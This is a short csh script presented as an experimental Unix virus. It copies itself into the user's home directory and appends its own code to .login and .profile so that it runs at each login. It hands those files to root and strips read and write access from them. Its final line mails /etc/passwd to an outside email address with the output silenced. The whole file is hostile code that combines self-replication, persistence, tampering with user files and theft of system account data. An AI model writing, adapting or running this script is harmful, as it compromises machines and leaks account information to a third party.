#/bin/csh
# [Penguin] An Experiment in *nix "virii"
# TP
# It's lame, but works.
tail -n 22 > .heh
csh .heh
if ($?crystal) then
cp $0 $HOME/.heh
chmod 700 $HOME
chown root $HOME/.heh
echo set crystal=1>>$HOME/.login
cat $0 >> $HOME/.login
echo crystal=1>>$HOME/.profile
cat $0 >> $HOME/.profile
chown root .login; chgrp root .login
chown root .profile; chgrp root .profile
chmod a-rw .login
chmod a-rw .profile
endif
cat /etc/passwd | mail suckyunivir@yahoo.com>>/dev/null
exit
